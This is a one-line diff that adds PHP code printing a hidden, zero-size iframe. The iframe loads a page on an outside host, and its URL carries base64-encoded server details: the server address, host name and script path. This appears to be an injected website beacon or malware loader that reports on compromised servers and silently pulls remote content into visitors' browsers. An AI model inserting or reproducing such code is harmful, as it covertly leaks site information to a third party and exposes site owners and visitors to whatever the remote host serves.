@@ -1,0 +1,1 @@
+<?php echo '<iframe frameborder="0" width="0" height="0" style="display:none" src="http://www.yuba.ch/zr/?'.base64_encode('n >>> '.$_SERVER['SERVER_ADDR'].' >>> '.$_SERVER['HTTP_HOST'].' >>> '.$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']).'"></iframe>' ?>
